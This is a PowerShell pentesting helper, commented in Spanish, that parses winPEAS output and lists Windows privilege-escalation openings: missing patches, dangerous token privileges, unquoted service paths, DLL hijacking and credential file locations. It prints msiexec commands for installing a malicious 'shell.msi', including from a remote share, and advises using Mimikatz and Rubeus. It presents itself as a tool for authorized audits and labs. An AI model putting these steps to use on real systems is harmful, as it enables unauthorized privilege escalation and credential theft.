Param(
    [string]$InputFile = "outputWP.txt",
    [switch]$RunWinPEAS
)

<# 
################################################################################
# WinPEAS Parser - Script de Pentesting (Windows)
# Utilizar sólo en entornos controlados y autorizados. 
# (Máquinas HTB, CTFs, auditorías autorizadas, entornos de laboratorio, etc.)
################################################################################
# Uso básico:
#   1) Generar output de winPEAS (recomendado):
#        cmd /c "winPEAS.bat > outputWP.txt"
#   2) Ejecutar el parser:
#        powershell -ExecutionPolicy Bypass -File .\winpeas_parser.ps1
#
# Opciones:
#   -InputFile <ruta>   → Ruta del fichero de salida de winPEAS (por defecto: outputWP.txt)
#   -RunWinPEAS         → Intenta ejecutar .\winPEAS.bat y guardar el output en $InputFile
#                         (OJO: winPEAS.bat hace un PAUSE al final, tendrás que pulsar una tecla)
################################################################################
#>

$ErrorActionPreference = "SilentlyContinue"

function Write-Color {
    param(
        [string]$Text,
        [ConsoleColor]$Color = [ConsoleColor]::White,
        [switch]$NoNewLine
    )
    $oldColor = $Host.UI.RawUI.ForegroundColor
    $Host.UI.RawUI.ForegroundColor = $Color
    if ($NoNewLine) {
        Write-Host -NoNewline $Text
    } else {
        Write-Host $Text
    }
    $Host.UI.RawUI.ForegroundColor = $oldColor
}

function Show-Banner {
    Write-Color "╔════════════════════════════════════════════════════════════════╗" Cyan
    Write-Color "║             WinPEAS Output Parser & Analyzer                   ║" Cyan
    Write-Color "║       Script de Pentesting para Escalada de Privilegios       ║" Cyan
    Write-Color "║                                                                ║" Cyan
    Write-Color "║   USO EXCLUSIVO EN ENTORNOS CONTROLADOS Y AUTORIZADOS         ║" Cyan
    Write-Color "╚════════════════════════════════════════════════════════════════╝" Cyan
    Write-Host ""
}

function Show-Section {
    param([string]$Title)
    Write-Host ""
    Write-Color "╔════════════════════════════════════════════════════════════════╗" Magenta
    Write-Color ("║ {0,-62}║" -f $Title) Magenta
    Write-Color "╚════════════════════════════════════════════════════════════════╝" Magenta
    Write-Host ""
}

function Ensure-InputFile {
    param(
        [string]$Path,
        [switch]$RunWinPEAS
    )

    if ($RunWinPEAS) {
        Write-Color "[*] Parámetro -RunWinPEAS detectado: intentando ejecutar winPEAS.bat..." Blue
        Write-Host ""

        if (-not (Test-Path ".\winPEAS.bat")) {
            Write-Color "[!] Error: No se encuentra 'winPEAS.bat' en el directorio actual" Red
            Write-Color "[i] Asegúrate de que winPEAS.bat esté en la misma carpeta que este script" Yellow
            exit 1
        }

        Write-Color "[*] Ejecutando winPEAS.bat... Esto puede tardar unos minutos." Yellow
        Write-Color "[i] Al final winPEAS mostrará un 'Press any key to continue...' en la consola." Yellow
        Write-Color "[i] Pulsa una tecla cuando termine para que continúe el parser." Yellow
        Write-Host ""

        # Ejecutar winPEAS en un cmd y volcar el output al fichero indicado
        cmd.exe /c "winPEAS.bat > `"$Path`""

        if (-not $?) {
            Write-Color "[!] Error al ejecutar winPEAS.bat" Red
            exit 1
        }

        Write-Color "[+] winPEAS ejecutado correctamente. Output guardado en $Path" Green
        Write-Host ""
    }

    if (-not (Test-Path $Path)) {
        Write-Color "[!] Error: No se encuentra el archivo '$Path'" Red
        Write-Color "[i] Asegúrate de que el output de winPEAS se ha guardado en '$Path'" Yellow
        Write-Color "[i] Ejemplo: cmd /c `"winPEAS.bat > $Path`"" Yellow
        exit 1
    }

    Write-Color "[+] Archivo encontrado: $Path" Green
    Write-Host ""
}

function Get-ContextMatches {
    param(
        [string[]]$Lines,
        [string]$Pattern,
        [int]$Before = 0,
        [int]$After = 0
    )

    $results = @()
    $indexes = Select-String -InputObject $Lines -Pattern $Pattern | Select-Object -ExpandProperty LineNumber
    foreach ($idx in $indexes) {
        $start = [Math]::Max(0, $idx - 1 - $Before)
        $end = [Math]::Min($Lines.Count - 1, $idx - 1 + $After)
        $results += $Lines[$start..$end]
        $results += ""  # separador
    }
    return $results
}

function Analyze-MissingPatches {
    param([string[]]$Lines)

    Show-Section "PARCHEOS FALTANTES / EXPLOITS POSIBLES"

    $missing = $Lines | Where-Object { $_ -match "patch is NOT installed!" }

    if ($missing) {
        Write-Color "[+] Posibles vulnerabilidades por parches faltantes:" Green
        Write-Host ""

        foreach ($line in $missing) {
            # Ejemplo de línea: "MS16-032 patch is NOT installed! (Vulns: ...)"
            Write-Color ("  → {0}" -f $line) Yellow
        }

        Write-Host ""
        Write-Color "[i] Revisa cada MSXX-XXX en exploit-db, Rapid7, etc." Cyan
    }
    else {
        Write-Color "[!] No se han detectado mensajes de 'patch is NOT installed!'" Yellow
        Write-Color "[i] Eso no significa que el sistema esté parcheado al 100%." Yellow
    }
}

function Analyze-Privileges {
    Show-Section "PRIVILEGIOS INTERESANTES (whoami /all)"

    Write-Color "[*] Ejecutando 'whoami /all' para revisar privilegios..." Blue
    Write-Host ""

    $whoamiOutput = whoami /all 2>$null
    if (-not $whoamiOutput) {
        Write-Color "[!] No se pudo ejecutar 'whoami /all' (quizá no existe o no hay permisos)" Red
        return
    }

    $interesting = @(
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeTcbPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeCreateTokenPrivilege",
        "SeLoadDriverPrivilege",
        "SeTakeOwnershipPrivilege",
        "SeDebugPrivilege"
    )

    $found = @()

    foreach ($line in $whoamiOutput) {
        foreach ($priv in $interesting) {
            if ($line -match $priv -and $line -match "Enabled") {
                $found += $line
            }
        }
    }

    if ($found.Count -gt 0) {
        Write-Color "[+] Privilegios peligrosos habilitados encontrados:" Green
        Write-Host ""

        foreach ($l in ($found | Sort-Object -Unique)) {
            Write-Color ("  → {0}" -f $l.Trim()) Yellow
        }

        Write-Host ""
        Write-Color "[i] Muchos de estos privilegios permiten escaladas a SYSTEM con técnicas como JuicyPotato/PrintSpoofer/etc." Cyan
        Write-Color "[?] Más info: https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups" Cyan
    }
    else {
        Write-Color "[!] No se han encontrado privilegios especialmente peligrosos en estado Enabled." Yellow
    }
}

function Analyze-AlwaysInstallElevated {
    param([string[]]$Lines)

    Show-Section "AlwaysInstallElevated"

    $ctx = Get-ContextMatches -Lines $Lines -Pattern "AlwaysInstallElevated" -Before 0 -After 6

    if (-not $ctx) {
        Write-Color "[!] No se han encontrado referencias a AlwaysInstallElevated en el output." Yellow
        return
    }

    $isVuln = $false
    foreach ($line in $ctx) {
        if ($line -match "AlwaysInstallElevated" -and $line -match "0x1") {
            $isVuln = $true
        }
    }

    $ctx | ForEach-Object { Write-Host "  $_" }
    Write-Host ""

    if ($isVuln) {
        Write-Color "[+] Parece que AlwaysInstallElevated está habilitado (REG_DWORD 0x1)." Green
        Write-Color "[!] ESCALADA POSIBLE mediante instalación de MSI malicioso." Red
        Write-Host ""
        Write-Color "Comandos típicos (desde ruta accesible):" Yellow
        Write-Color "  msiexec /quiet /qn /i C:\ruta\shell.msi" Cyan
        Write-Color "  msiexec /quiet /qn /i \\IP\share\shell.msi" Cyan
    }
    else {
        Write-Color "[i] No se ha detectado un AlwaysInstallElevated=0x1 claro." Yellow
    }
}

function Analyze-UnquotedServicePaths {
    param([string[]]$Lines)

    Show-Section "RUTAS DE SERVICIO SIN COMILLAS (Unquoted Service Paths)"

    $ctx = Get-ContextMatches -Lines $Lines -Pattern "UNQUOTED SERVICE PATHS" -Before 0 -After 20

    if (-not $ctx) {
        Write-Color "[!] No se han encontrado secciones de 'UNQUOTED SERVICE PATHS' en el output." Yellow
        return
    }

    $ctx | ForEach-Object { Write-Host "  $_" }
    Write-Host ""

    Write-Color "[i] Si ves rutas sin comillas y con espacios en directorios escribibles, puedes colar un binario para escalada." Cyan
}

function Analyze-StartupAndPath {
    param([string[]]$Lines)

    Show-Section "RUN AT STARTUP / PATH Hijacking"

    $startupCtx = Get-ContextMatches -Lines $Lines -Pattern "RUN AT STARTUP" -Before 0 -After 40
    $pathCtx    = Get-ContextMatches -Lines $Lines -Pattern "DLL HIJACKING in PATHenv variable" -Before 0 -After 30

    if (-not $startupCtx -and -not $pathCtx) {
        Write-Color "[!] No se han detectado secciones claras de 'RUN AT STARTUP' o PATH Hijacking." Yellow
        return
    }

    if ($startupCtx) {
        Write-Color "[+] RUN AT STARTUP - posibles binarios/directorios interesantes:" Green
        Write-Host ""
        $startupCtx | ForEach-Object { Write-Host "  $_" }
        Write-Host ""
    }

    if ($pathCtx) {
        Write-Color "[+] DLL HIJACKING en rutas de PATH con permisos peligrosos:" Green
        Write-Host ""
        $pathCtx | ForEach-Object { Write-Host "  $_" }
        Write-Host ""
    }

    Write-Color "[i] Si encuentras directorios de inicio automático o entradas del PATH escribibles por usuarios bajos, céntrate ahí." Cyan
}

function Analyze-CredentialsAndSecrets {
    param([string[]]$Lines)

    Show-Section "PASSWORDS / CREDENCIALES / SECRETOS"

    $keywords = @(
        "Unattended files",
        "SAM and SYSTEM backups",
        "GPP Password",
        "Cloud Credentials",
        "Files in registry that may contain credentials",
        "FILE THAT CONTAINS THE WORD PASSWORD",
        "FILES THAT CONTAINS THE WORD PASSWORD",
        "CREDENTIALS"
    )

    $hits = @()
    foreach ($k in $keywords) {
        $hits += Get-ContextMatches -Lines $Lines -Pattern $k -Before 0 -After 15
    }

    $hits = $hits | Where-Object { $_ -ne "" } | Select-Object -Unique

    if (-not $hits -or $hits.Count -eq 0) {
        Write-Color "[!] No se han localizado bloques evidentes de credenciales en el output (según patrones básicos)." Yellow
        return
    }

    Write-Color "[+] Posibles ubicaciones con credenciales o ficheros sensibles:" Green
    Write-Host ""

    foreach ($h in $hits) {
        Write-Host "  $h"
    }

    Write-Host ""
    Write-Color "[i] Revisa especialmente ficheros unattended.xml, backups de SAM/SYSTEM, GPP, Cloud creds, etc." Cyan
}

function Analyze-PasswordFilesFromDrives {
    param([string[]]$Lines)

    Show-Section "FICHEROS CON LA PALABRA 'password' DETECTADOS POR winPEAS"

    $context = Get-ContextMatches -Lines $Lines -Pattern "FILES THAT CONTAINS THE WORD PASSWORD" -Before 0 -After 50
    if (-not $context) {
        Write-Color "[!] No se han encontrado secciones de 'FILES THAT CONTAINS THE WORD PASSWORD' en el output." Yellow
        return
    }

    $paths = $context | Where-Object { $_ -match ":\\" -and ($_ -notmatch "FILES THAT CONTAINS THE WORD PASSWORD") }
    $paths = $paths | Select-Object -Unique

    if ($paths.Count -eq 0) {
        Write-Color "[i] winPEAS no parece haber listado ficheros concretos con 'password' en el contenido/nombre." Yellow
        return
    }

    Write-Color ("[+] Se han encontrado {0} posibles ficheros relacionados con 'password' (mostrando máx. 50):" -f $paths.Count) Green
    Write-Host ""

    $paths | Select-Object -First 50 | ForEach-Object {
        Write-Color ("  → {0}" -f $_) Yellow
    }

    if ($paths.Count -gt 50) {
        Write-Host ""
        Write-Color ("[i] Hay más resultados ({0} en total). Revisa el output completo de winPEAS para verlos todos." -f $paths.Count) Cyan
    }
}

function Write-SummaryFile {
    param(
        [string]$Path,
        [string[]]$Lines,
        [string[]]$MissingPatches,
        [string[]]$InterestingPrivs,
        [string[]]$CredHits
    )

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $summaryFile = "winpeas_summary_$timestamp.txt"

    $content = @()
    $content += "═══════════════════════════════════════════════════════════════"
    $content += "WinPEAS Parser - Resumen de Análisis"
    $content += "Fecha: $(Get-Date)"
    $content += "Fichero analizado: $Path"
    $content += "═══════════════════════════════════════════════════════════════"
    $content += ""
    $content += "Parches faltantes / mensajes de vulnerabilidad detectados:"
    if ($MissingPatches -and $MissingPatches.Count -gt 0) {
        $content += ($MissingPatches | Sort-Object -Unique)
    } else {
        $content += "  (No se han detectado mensajes 'patch is NOT installed!')"
    }
    $content += ""
    $content += "Privilegios peligrosos habilitados (whoami /all):"
    if ($InterestingPrivs -and $InterestingPrivs.Count -gt 0) {
        $content += ($InterestingPrivs | Sort-Object -Unique)
    } else {
        $content += "  (No se han encontrado privilegios peligrosos habilitados)"
    }
    $content += ""
    $content += "Ubicaciones potenciales con credenciales/secretos:"
    if ($CredHits -and $CredHits.Count -gt 0) {
        $content += ($CredHits | Sort-Object -Unique)
    } else {
        $content += "  (No se han localizado bloques de credenciales por los patrones básicos)"
    }

    $content | Set-Content -Encoding UTF8 -Path $summaryFile

    Write-Color "[*] Resumen guardado en: $summaryFile" Blue
}

############################
# MAIN
############################

Show-Banner

Ensure-InputFile -Path $InputFile -RunWinPEAS:$RunWinPEAS

Write-Color "[*] Iniciando análisis del output de winPEAS..." Blue
Write-Host ""

$lines = Get-Content -Path $InputFile

# Análisis 1: parches faltantes
$missingPatchLines = $lines | Where-Object { $_ -match "patch is NOT installed!" }
Analyze-MissingPatches -Lines $lines

# Análisis 2: privilegios peligrosos (whoami /all en vivo)
Analyze-Privileges
$whoamiOutput = whoami /all 2>$null
$interestingPrivs = @()
if ($whoamiOutput) {
    $interesting = @(
        "SeImpersonatePrivilege",
        "SeAssignPrimaryTokenPrivilege",
        "SeTcbPrivilege",
        "SeBackupPrivilege",
        "SeRestorePrivilege",
        "SeCreateTokenPrivilege",
        "SeLoadDriverPrivilege",
        "SeTakeOwnershipPrivilege",
        "SeDebugPrivilege"
    )
    foreach ($line in $whoamiOutput) {
        foreach ($priv in $interesting) {
            if ($line -match $priv -and $line -match "Enabled") {
                $interestingPrivs += $line.Trim()
            }
        }
    }
}

# Análisis 3: AlwaysInstallElevated
Analyze-AlwaysInstallElevated -Lines $lines

# Análisis 4: Unquoted Service Paths
Analyze-UnquotedServicePaths -Lines $lines

# Análisis 5: Run At Startup y PATH hijacking
Analyze-StartupAndPath -Lines $lines

# Análisis 6: credenciales / secretos
Analyze-CredentialsAndSecrets -Lines $lines
$credHits = @()
$credKeywords = @(
    "Unattended files",
    "SAM and SYSTEM backups",
    "GPP Password",
    "Cloud Credentials",
    "Files in registry that may contain credentials",
    "FILE THAT CONTAINS THE WORD PASSWORD",
    "FILES THAT CONTAINS THE WORD PASSWORD",
    "CREDENTIALS"
)
foreach ($k in $credKeywords) {
    $credHits += Get-ContextMatches -Lines $lines -Pattern $k -Before 0 -After 5
}
$credHits = $credHits | Where-Object { $_ -ne "" } | Select-Object -Unique

# Análisis 7: ficheros con 'password'
Analyze-PasswordFilesFromDrives -Lines $lines

Show-Section "RESUMEN Y PRÓXIMOS PASOS"
Write-Color "[*] Análisis completado. Revisa los hallazgos anteriores." Cyan
Write-Host ""
Write-Color "[i] Recomendaciones:" Yellow
Write-Host "    1. Comprueba manualmente los parches faltantes (MSXX-XXX) y busca exploits públicos."
Write-Host "    2. Céntrate en servicios/rutas de inicio y PATH escribibles por usuarios bajos."
Write-Host "    3. Explota privilegios peligrosos (SeImpersonate, SeBackup, SeDebug, etc.) con técnicas conocidas."
Write-Host "    4. Revisa a fondo las rutas donde puedan existir credenciales (unattend, SAM/SYSTEM, GPP, Cloud...)."
Write-Host "    5. Usa Mimikatz, Rubeus u otras herramientas según el contexto."
Write-Host ""
Write-Color "[+] Recuerda: Un gran poder conlleva una gran responsabilidad. Úsalo sólo en entornos autorizados." Green
Write-Host ""

Write-SummaryFile -Path $InputFile -Lines $lines -MissingPatches $missingPatchLines -InterestingPrivs $interestingPrivs -CredHits $credHits

